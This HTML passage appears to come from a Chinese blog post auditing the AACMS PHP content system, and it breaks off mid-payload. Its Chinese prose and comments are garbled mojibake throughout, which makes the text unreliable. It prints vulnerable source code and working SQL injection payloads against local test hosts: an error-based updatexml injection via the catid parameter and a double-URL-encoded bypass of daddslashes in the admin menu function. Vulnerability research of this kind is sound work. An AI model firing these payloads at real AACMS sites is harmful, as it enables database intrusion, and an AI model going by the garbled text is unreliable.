class="hljs-keyword">$this</span>-&gt;_init_session();<span class="hljs-comment">// åˆå§‹åŒ–session</span><br><span class="hljs-keyword">$this</span>-&gt;_init_setting();<span class="hljs-comment">//</span><br><span class="hljs-keyword">$this</span>-&gt;_init_misc();<span class="hljs-comment">//åˆå§‹åŒ–æ—¶åŒº</span><br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_init_db</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-comment">// åˆ›å»ºæ•°æ®åº“è¿æ¥</span><br><span class="hljs-keyword">global</span> <span class="hljs-variable">$_G</span>;<br><br><span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;db_mysql&#x27;</span>;<br><span class="hljs-keyword">if</span>(count(<span class="hljs-variable">$_G</span>[<span class="hljs-string">&#x27;config&#x27;</span>][<span class="hljs-string">&#x27;db&#x27;</span>][<span class="hljs-string">&#x27;slave&#x27;</span>])) &#123;<span class="hljs-comment">// configä¸­æ ¹æœ¬æ²¡æœ‰è¯¥å†…å®¹ï¼Œæ‰€ä»¥æ— æ³•è¿›å…¥</span><br><span class="hljs-keyword">require_once</span> libfile(<span class="hljs-string">&#x27;class/mysql_slave&#x27;</span>);<br><span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;db_mysql_slave&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">$this</span>-&gt;db = &amp; DB::object(<span class="hljs-variable">$class</span>);<br><span class="hljs-keyword">$this</span>-&gt;db-&gt;set_config(<span class="hljs-variable">$_G</span>[<span class="hljs-string">&#x27;config&#x27;</span>][<span class="hljs-string">&#x27;db&#x27;</span>]);<br><span class="hljs-keyword">$this</span>-&gt;db-&gt;connect();<br><br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå¼•å…¥äº†$_Gè¿™ä¸ªå…¨å±€å˜é‡ï¼Œå¹¶ä¸”æ ¹æ®è¯¥å…¨å±€å˜é‡çš„å€¼è¿›è¡Œäº†ä¸€ä¸ªåˆ¤æ–­ï¼Œè€ŒPHPä¸­å¹¶æ²¡æœ‰ç»™å‡ºè¿™ä¸ªå…¨å±€å˜é‡ï¼Œå¹¶ä¸”åœ¨å‰é¢ä¹Ÿæ²¡æœ‰å¯¹è¯¥å˜é‡çš„å€¼è¿›è¡Œä¸€ä¸ªå®šä¹‰æ“ä½œï¼Œæ‰€ä»¥ï¼Œéœ€è¦å¯»æ‰¾ä¸€ä¸‹è¯¥å…¨å±€å˜é‡æ˜¯ä»å“ªé‡Œæ¥çš„ã€‚</p><p>PHPåœ¨å®ä¾‹åŒ–ç±»æ—¶ï¼Œä¼šè°ƒç”¨æ„é€ æ–¹æ³•ï¼Œè€Œæ„é€ æ–¹æ³•åˆ†ä¸¤ç§ï¼Œä¸€ç§æ˜¯__construct é­”æœ¯æ–¹æ³•ï¼›å¦ä¸€ç§æ˜¯å°†æˆå‘˜æ–¹æ³•å®šä¹‰ä¸ºç±»åã€‚è¿™é‡Œæ²¡æœ‰ä½¿ç”¨é­”æœ¯æ–¹æ³•ï¼Œæ‰€ä»¥è‚¯å®šæ˜¯ç›´æ¥ä½¿ç”¨çš„ä¸ç±»åç›¸åŒçš„æˆå‘˜æ–¹æ³•ï¼Œæ‰¾åˆ°è¯¥æ–¹æ³•ï¼Œè·Ÿè¿›å¹¶ç®€ç­”åˆ†ææ¯ä¸€ä¸ªæ–¹æ³•çš„ä½œç”¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">core</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-comment">// çœ‹åå­—éƒ½çŸ¥é“æ˜¯ä¸€å †åˆå§‹åŒ–</span><br><span class="hljs-keyword">$this</span>-&gt;_init_env();<span class="hljs-comment">// å±è”½é”™è¯¯ä¿¡æ¯ã€è®¾ç½®sessionã€è®¾ç½®XXFå¤´ï¼Œå¯¹$_Gè¿›è¡Œä¸€å®šçš„èµ‹å€¼</span><br><span class="hljs-keyword">$this</span>-&gt;_init_config();<span class="hljs-comment">// å°†é…ç½®æ–‡ä»¶å…¨éƒ¨å†™å…¥åˆ°$_Gä¸­</span><br><span class="hljs-keyword">$this</span>-&gt;_init_input();<span class="hljs-comment">// å°†GET\POST\COOKIE\FILEç­‰è¾“å…¥å…¨éƒ¨è¿›è¡Œé­”æœ¯å¼•å·è¿‡æ»¤</span><br><span class="hljs-keyword">$this</span>-&gt;_init_output();<span class="hljs-comment">// å®šä¹‰OBç¼“å†²æœºåˆ¶ï¼Œå³è¿”å›åŒ…ç›¸å…³å†…å®¹</span><br>&#125;<br></code></pre></td></tr></table></figure><p>å›åˆ°<code>init()</code>æ–¹æ³•ä¸­è°ƒç”¨çš„<code>__init_db()</code>æ–¹æ³•ï¼Œè·Ÿè¿›ï¼Œç¡®å®šè¯¥æ–¹æ³•æ˜¯ç”¨æ¥å»ºç«‹æ•°æ®åº“é“¾æ¥ï¼Œ/config/config_global.phpä¸­è¯»å–ç›¸å…³é…ç½®ä¿¡æ¯ï¼Œç„¶åè¿›è¡Œç®€å†æ•°æ®åº“é“¾æ¥</p><p>è·Ÿè¿›<code>_init_memory()</code>æ–¹æ³•ï¼Œå‘ç°æ˜¯åˆå§‹åŒ–memory</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_init_memory</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-comment">// åˆå§‹åŒ–memory</span><br><span class="hljs-keyword">global</span> <span class="hljs-variable">$_G</span>;<br><br><span class="hljs-keyword">$this</span>-&gt;mem = <span class="hljs-keyword">new</span> memory();<span class="hljs-comment">// å®ä¾‹åŒ–memoryç±»</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;init_memory) &#123;<br><span class="hljs-keyword">$this</span>-&gt;mem-&gt;init(<span class="hljs-keyword">$this</span>-&gt;config[<span class="hljs-string">&#x27;memory&#x27;</span>]);<br>&#125;<br><span class="hljs-variable">$_G</span>[<span class="hljs-string">&#x27;memory&#x27;</span>] = <span class="hljs-keyword">$this</span>-&gt;mem-&gt;type;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>åé¢çš„ä¹Ÿéƒ½æ˜¯ä¸€äº›åˆå§‹åŒ–æ“ä½œï¼Œæ‰€ä»¥å›åˆ°index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span> template(<span class="hljs-string">&#x27;index&#x27;</span>);<br></code></pre></td></tr></table></figure><p>è·Ÿè¿›<code>template()</code>,å…¶å®å°±æ˜¯å°†æ•°æ®åº“ä¸­çš„æ–‡ç« æ˜¾ç¤ºåœ¨index.phpä¸­</p><p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/5.png"></p><p>index.phpåˆ†æå®Œäº†ï¼Œç»“æœæ˜¯æ²¡æœ‰ä»»ä½•å‘ç°ï¼Œä½†å¯¹è¯¥CMSæœ‰äº†ä¸€å®šçš„äº†è§£ã€‚ç»§ç»­åˆ†æå…¶ä»–çš„å…¥å£å‡½æ•°</p><h6 id="article-php"><a href="#article-php" class="headerlink" title="article.php"></a>article.php</h6><p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/6.png"></p><p>è·Ÿéšå¤§å“¥çš„æ€è·¯ï¼Œçœ‹ä¸€ä¸‹article_view.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>(!defined(<span class="hljs-string">&#x27;IN_AACMS&#x27;</span>)) &#123;<span class="hljs-comment">// è¯¥å€¼å‰é¢å®šä¹‰è¿‡ï¼Œä¸ºTrue</span><br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;Access Denied&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$aid</span> = intval(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;aid&#x27;</span>]);<span class="hljs-comment">// è·å–aid</span><br><span class="hljs-variable">$article</span> = DB::getRow(<span class="hljs-string">&#x27;SELECT * FROM &#x27;</span>.DB::table(<span class="hljs-string">&#x27;article&#x27;</span>).<span class="hljs-string">&quot; WHERE aid=&#x27;<span class="hljs-subst">$aid</span>&#x27;&quot;</span>);<span class="hljs-comment">// æ ¹æ®aidè¿”å›æ–‡ç« </span><br><br><br><br><span class="hljs-keyword">include</span> template(<span class="hljs-string">&#x27;article/view&#x27;</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>åœ¨æ•°æ®åº“ä¸­æ’å…¥ä¸€æ¡è®°å½•ï¼Œå› ä¸ºè¯¥è¡¨ä¸­çš„æ‰€æœ‰å­—æ®µéƒ½ä¸èƒ½ä¸ºnullï¼Œæ‰€ä»¥åªèƒ½æ‰€æœ‰çš„éƒ½æ·»åŠ ä¸Š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">INSERT INTO `aacms`.`pre_article`(`aid`, `catid`, `title`, `uid`, `username`, `author`, `from`, `fromurl`, `summary`, `content`, `pic`, `remote`, `allowcomment`, `tag`, `dateline`) VALUES (1, 1, &#x27;aacms ä»£ç å®¡è®¡&#x27;, 1, &#x27;xxx&#x27;, &#x27;mechoy&#x27;, &#x27;freebuf&#x27;, &#x27;xxx&#x27;, &#x27;xxx&#x27;, &#x27;ä»£ç å®¡è®¡&#x27;, &#x27;xx&#x27;, 1, 1, 1, 1)<br></code></pre></td></tr></table></figure><p>åœ¨æµè§ˆå™¨ä¸­è¿›è¡Œè®¿é—®</p><p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/7.png"></p><p>ä»è¿™é‡Œå¼€çœ‹ï¼Œå¦‚æœåœ¨æ’å…¥titleå’Œcontentæ—¶å†…å®¹å¯æ§ï¼Œåˆ™å¯èƒ½å­˜åœ¨äºŒæ¬¡æ³¨å…¥ï¼›æ¯”å¦‚æ‰§è¡Œå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">INSERT INTO `aacms`.`pre_article`(`aid`, `catid`, `title`, `uid`, `username`, `author`, `from`, `fromurl`, `summary`, `content`, `pic`, `remote`, `allowcomment`, `tag`, `dateline`) VALUES (2, 2,database(), 2, &#x27;xxx&#x27;, &#x27;mechoy&#x27;, &#x27;freebuf&#x27;, &#x27;xxx&#x27;, &#x27;xxx&#x27;, user(), &#x27;xx&#x27;, 1, 1, 1, 1)<br></code></pre></td></tr></table></figure><p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/8.png"></p><p>å›åˆ°article.phpï¼Œè¿™é‡Œæ¥æ”¶äº†ä¸€ä¸ªaidï¼Œä½†æ˜¯aidç»è¿‡<code>intval()</code>çš„å¤„ç†äº†ï¼Œè€Œ<code>intval()</code>å‡½æ•°çš„è¿”å›å˜é‡ <code>var</code> çš„ [integer]æ•°å€¼ï¼Œæ‰€ä»¥å¯¼è‡´æ— æ³•å®ç°æ³¨å…¥ï¼›</p><h6 id="admin-php"><a href="#admin-php" class="headerlink" title="admin.php"></a>admin.php</h6><p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/9.png"></p><p>åœ¨æ²¡æœ‰ç™»é™†çš„çŠ¶æ€ä¸‹ï¼Œé»˜è®¤æ˜¯è¿›å…¥åˆ°admin_member.phpä¸­ï¼Œå¹¶ä¸”æ ¹æ®operationçš„å€¼è·³å…¥åˆ°æŒ‡å®šæ¨¡å—ä¸­å»</p><p>åˆ°è¿™é‡Œï¼Œä¸‰ä¸ªå…¥å£å‡½æ•°åŸºæœ¬äº†è§£æ¸…æ¥šï¼Œç”±äºindex.phpå’Œarticle.phpæ²¡æœ‰ä»€ä¹ˆå†…å®¹ï¼Œæ‰€ä»¥åªèƒ½ä»admin.phpå¤„ä¸‹æ‰‹è¿›è¡Œå®¡è®¡ã€‚</p><h4 id="æ¼æ´"><a href="#æ¼æ´" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h4><h5 id="å‘ç°çš„æ¼æ´"><a href="#å‘ç°çš„æ¼æ´" class="headerlink" title="å‘ç°çš„æ¼æ´"></a>å‘ç°çš„æ¼æ´</h5><h6 id="1-å‰å°SQLæ³¨å…¥"><a href="#1-å‰å°SQLæ³¨å…¥" class="headerlink" title="1.å‰å°SQLæ³¨å…¥"></a>1.å‰å°SQLæ³¨å…¥</h6><p>è¿™é‡Œéœ€è¦å…ˆåœ¨åå°æ–‡ç« å¤„æ·»åŠ ä¸€ä¸ªæ ç›®</p><p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/15.png"></p><p>ç„¶åå†è®¿é—®<a href="http://127.0.0.1/aacms28/article.php%E5%B0%B1%E8%83%BD%E7%9C%8B%E5%88%B0">http://127.0.0.1/aacms28/article.phpå°±èƒ½çœ‹åˆ°</a></p><p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/16.png"></p><p>ç»™<code>catid</code>å‚æ•°åŠ ä¸ªå•å¼•å·,é¡µé¢çˆ†å‡ºæ•°æ®åº“é”™è¯¯</p><p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/17.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//127.0.0.1/aacms/article.php?catid=1)--%20  //é¡µé¢è¿”å›æ­£å¸¸</span><br></code></pre></td></tr></table></figure><p>ç”±æ­¤å¯ä»¥æ„é€ payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//127.0.0.1/aacms/article.php?catid=1)%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)%23</span><br></code></pre></td></tr></table></figure><p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/18.png"></p><p>è¿™é‡Œç”±äºæ˜¯é»‘ç›’æµ‹è¯•çš„ï¼Œæ‰€ä»¥éœ€è¦å»å›å»çœ‹ä¸€ä¸‹æºç ï¼Œçœ‹ä¸€ä¸‹æºç è¯¥æ¼æ´æ˜¯å¦‚ä½•å½¢æˆçš„ï¼Œå¯ä»¥æ ¹æ®æŠ¥é”™ä¿¡æ¯å»å¯»æ‰¾æ¼æ´ç‚¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># æ¼æ´ä½ç½®ä½äº/aacms/source/function/block/block.article.php 25-40è¡Œ</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$paramarr</span>[<span class="hljs-string">&#x27;aid&#x27;</span>]) &#123; <span class="hljs-comment">// ä¼ å…¥catid,æ²¡æœ‰aidï¼Œæ‰€ä»¥ç›´æ¥è¿›å…¥else</span><br><span class="hljs-variable">$wherearr</span>[] = <span class="hljs-string">&#x27;aid IN (&#x27;</span>.<span class="hljs-variable">$paramarr</span>[<span class="hljs-string">&#x27;aid&#x27;</span>].<span class="hljs-string">&#x27;)&#x27;</span>;<br>&#125;  <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$catid</span> = <span class="hljs-variable">$paramarr</span>[<span class="hljs-string">&#x27;catid&#x27;</span>] ? <span class="hljs-variable">$paramarr</span>[<span class="hljs-string">&#x27;catid&#x27;</span>] : (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;catid&#x27;</span>] ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;catid&#x27;</span>] : <span class="hljs-string">&#x27;0&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$catid</span>) &#123;<br><span class="hljs-variable">$wherearr</span>[] = <span class="hljs-string">&#x27;catid IN (&#x27;</span>.<span class="hljs-variable">$catid</span>.<span class="hljs-string">&#x27;)&#x27;</span>;<span class="hljs-comment">// é‡‡ç”¨ç›´æ¥æ‹¼æ¥</span><br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$wherearr</span>) &#123;<br><span class="hljs-variable">$sql</span>[<span class="hljs-string">&#x27;where&#x27;</span>] = implode(<span class="hljs-string">&#x27; AND &#x27;</span>, <span class="hljs-variable">$wherearr</span>);    <span class="hljs-comment">// è¿”å›ä¸€ä¸ªç”±æ•°æ®å…ƒç´ ç»„åˆæˆçš„å­—ç¬¦ä¸²</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$sql</span>[<span class="hljs-string">&#x27;where&#x27;</span>] = <span class="hljs-string">&#x27; 1 &#x27;</span>;<br>&#125;<br>    <span class="hljs-comment"># SELECT COUNT(*) FROM pre_article_index WHERE catid IN (1)</span><br><span class="hljs-variable">$count</span> = DB::getOne(<span class="hljs-string">&quot;SELECT COUNT(*) FROM &quot;</span>.DB::table(<span class="hljs-string">&#x27;article_index&#x27;</span>).<span class="hljs-string">&#x27; WHERE &#x27;</span>.<span class="hljs-variable">$sql</span>[<span class="hljs-string">&#x27;where&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>æ­¤å¤„æ˜¯å› ä¸ºå¯¹<code>$catid</code>ç›´æ¥æ‹¼æ¥ï¼Œå¹¶ä¸”è¯¥å˜é‡æ²¡æœ‰å•å¼•å·è¿›è¡Œä¿æŠ¤</p><h5 id="å¤ç°çš„æ¼æ´"><a href="#å¤ç°çš„æ¼æ´" class="headerlink" title="å¤ç°çš„æ¼æ´"></a>å¤ç°çš„æ¼æ´</h5><h6 id="1-urldecodeå¯¼è‡´çš„æ³¨å…¥æ¼æ´"><a href="#1-urldecodeå¯¼è‡´çš„æ³¨å…¥æ¼æ´" class="headerlink" title="1.urldecodeå¯¼è‡´çš„æ³¨å…¥æ¼æ´"></a>1.<strong>urldecodeå¯¼è‡´çš„æ³¨å…¥æ¼æ´</strong></h6><p>æ¼æ´ä½ç½® <code>\admin\admin_misc.php</code></p><p>è¿™ä¸ªæ¼æ´äº§ç”Ÿçš„åŸå› åœ¨äºç¨‹åºå¯¹äºæ¥å—çš„GETå‚æ•°å†æ¬¡è¿›è¡Œäº†urlè§£ç ï¼Œå› ä¸ºæµè§ˆå™¨åœ¨å‘webåº”ç”¨å‘é€å‚æ•°æ—¶æ˜¯å·²ç»è¿›è¡Œäº†ä¸€æ¬¡urlè§£ç ï¼Œç„¶åç»è¿‡<code>daddslashes()</code>è¿‡æ»¤ï¼Œä½†ç¨‹åºå†…éƒ¨å†ä¸€æ¬¡è¿›è¡Œäº†urlè§£ç ï¼Œå°±å¯¼è‡´å¯ä»¥é‡‡ç”¨ä¸¤æ¬¡urlç¼–ç æ¥ç»•è¿‡<code>daddslashes()</code>ï¼Œä»è€Œå®ç°æ³¨å…¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$operation</span> == <span class="hljs-string">&#x27;custommenu_add&#x27;</span>) &#123;      <span class="hljs-comment">// æµè§ˆå™¨åœ¨å‘webåº”ç”¨ä¼ å‚æ—¶ä¼šè¿›è¡Œä¸€æ¬¡urlè§£ç </span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;title&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]) &#123;        <span class="hljs-comment">// ä¸ä¸ºç©ºåˆ™è¿›å…¥</span><br><br><span class="hljs-variable">$title</span> = urldecode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);     <span class="hljs-comment">// urlå†æ¬¡è§£ç ï¼Œå¯¼è‡´å¯ä»¥ç›´æ¥ç»•è¿‡é­”æœ¯å¼•å·</span><br><span class="hljs-variable">$url</span> = urldecode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br><br><span class="hljs-keyword">if</span>(DB::getOne(<span class="hljs-string">&quot;SELECT id FROM &quot;</span>.DB::table(<span class="hljs-string">&#x27;admincp_menu&#x27;</span>).<span class="hljs-string">&quot; WHERE title=&#x27;<span class="hljs-subst">$title</span>&#x27;&quot;</span>)) &#123;<br>cpmsg(<span class="hljs-string">&#x27;custommenu_duplicate&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<br>DB::insert(<span class="hljs-string">&#x27;admincp_menu&#x27;</span>, <span class="hljs-keyword">array</span>(<br><span class="hljs-string">&#x27;title&#x27;</span> =&gt; <span class="hljs-variable">$title</span>,<br><span class="hljs-string">&#x27;displayorder&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br><span class="hljs-string">&#x27;url&#x27;</span> =&gt; <span class="hljs-variable">$url</span><br>));<br><br>cpmsg(<span class="hljs-string">&#x27;custommenu_add_succeed&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;succeed&#x27;</span>);<br><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>cpmsg(<span class="hljs-string">&#x27;parameters_error&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>æ„é€ <code>url:http://192.168.0.103/aacms28/admin.php?action=misc&amp;operation=custommenu_add&amp;url=456&amp;title=1%2527%20or%20updatexml(1,concat(0x7e,user()),1)%23</code></p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œçš„æ³¨é‡Šç¬¦ä¸èƒ½ç›´æ¥è¾“å…¥ï¼Œéœ€è¦å°†å…¶è¿›è¡Œurlç¼–ç åå†ä¼ å…¥</p><p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/10.png"></p><h6 id="2-äºŒæ¬¡æ³¨å…¥æ¼æ´"><a href="#2-äºŒæ¬¡æ³¨å…¥æ¼æ´" class="headerlink" title="2.äºŒæ¬¡æ³¨å…¥æ¼æ´"></a>2.äºŒæ¬¡æ³¨å…¥æ¼æ´</h6><p>å†å›æ¥çœ‹åˆšåˆšçš„ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$operation</span> == <span class="hljs-string">&#x27;custommenu_add&#x27;</span>) &#123;      <span class="hljs-comment">// æµè§ˆå™¨åœ¨å‘webåº”ç”¨ä¼ å‚æ—¶ä¼šè¿›è¡Œä¸€æ¬¡urlè§£ç </span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;title&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]) &#123;        <span class="hljs-comment">// ä¸ä¸ºç©ºåˆ™è¿›å…¥</span><br><br><span class="hljs-variable">$title</span> = urldecode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);     <span class="hljs-comment">// urlå†æ¬¡è§£ç ï¼Œå¯¼è‡´å¯ä»¥ç›´æ¥ç»•è¿‡é­”æœ¯å¼•å·</span><br><span class="hljs-variable">$url</span> = urldecode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br><br><span class="hljs-keyword">if</span>(DB::getOne(<span class="hljs-string">&quot;SELECT id FROM &quot;</span>.DB::table(<span class="hljs-string">&#x27;admincp_menu&#x27;</span>).<span class="hljs-string">&quot; WHERE title=&#x27;<span class="hljs-subst">$title</span>&#x27;&quot;</span>)) &#123;<br>cpmsg(<span class="hljs-string">&#x27;custommenu_duplicate&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<br>DB::insert(<span class="hljs-string">&#x27;admincp_menu&#x27;</span>, <span class="hljs-keyword">array</span>(<br><span class="hljs-string">&#x27;title&#x27;</span> =&gt; <span class="hljs-variable">$title</span>,<span class="hljs-comment">// ç›´æ¥å‘æ•°æ®åº“ä¸­æ’å…¥title</span><br><span class="hljs-string">&#x27;displayorder&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br><span class="hljs-string">&#x27;url&#x27;</span> =&gt; <span class="hljs-variable">$url</span><br>));<br><br>cpmsg(<span class="hljs-string">&#x27;custommenu_add_succeed&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;succeed&#x27;</span>);<br><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>cpmsg(<span class="hljs-string">&#x27;parameters_error&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>èƒ½å¤Ÿå‘ç°ï¼Œä¸‹é¢è¿˜æœ‰ä¸€æ¡æ’å…¥è¯­å¥ï¼Œç”±äºé­”æœ¯å¼•å·å·²ç»è¢«ç»•è¿‡äº†ï¼Œæ‰€ä»¥è¿™é‡Œä¹Ÿåˆ©ç”¨ä¸€ä¸‹</p><p>å…ˆçœ‹ä¸€ä¸‹æ­£å¸¸æ’å…¥æ—¶ï¼Œæ•°æ®åº“çš„æ‰§è¡Œæƒ…å†µï¼Œæ‰§è¡Œ<code>title=1&amp;url=2</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">QueryDESC pre_admincp_menu<br>QueryINSERT INTO pre_admincp_menu (`title`, `url`, `displayorder`) VALUES (&#x27;1&#x27;, &#x27;2&#x27;, &#x27;0&#x27;)<br></code></pre></td></tr></table></figure><p>çœ‹åˆ°è¿™é‡Œå°±å¯ä»¥è¿›è¡Œpayloadçš„æ„é€ äº†</p><p>ç”±äºä¸Šé¢æœ‰<code>DB::getOne(&quot;SELECT id FROM &quot;.DB::table(&#39;admincp_menu&#39;).&quot; WHERE title=&#39;$title&#39;&quot;)</code></p><p>è¿™é‡Œå¯¹titleè¿›è¡Œäº†ä¸€ä¸ªæŸ¥è¯¢ï¼Œå¦‚æœå°†payloadæ’å…¥åˆ°titleä½ç½®ï¼Œé‚£ä¹ˆå°†ä¼šç›´æ¥å¯¼è‡´è¿™æ¡sqlè¯­å¥æ— æ³•æ­£å¸¸æ‰§è¡Œï¼Œç„¶åç¨‹åºæŠ¥é”™åœæ­¢ï¼Œæ‰€ä»¥åªèƒ½å°†payloadæ’å…¥åˆ°urlä½ç½®</p><p>æ„é€ <code>payload:</code> 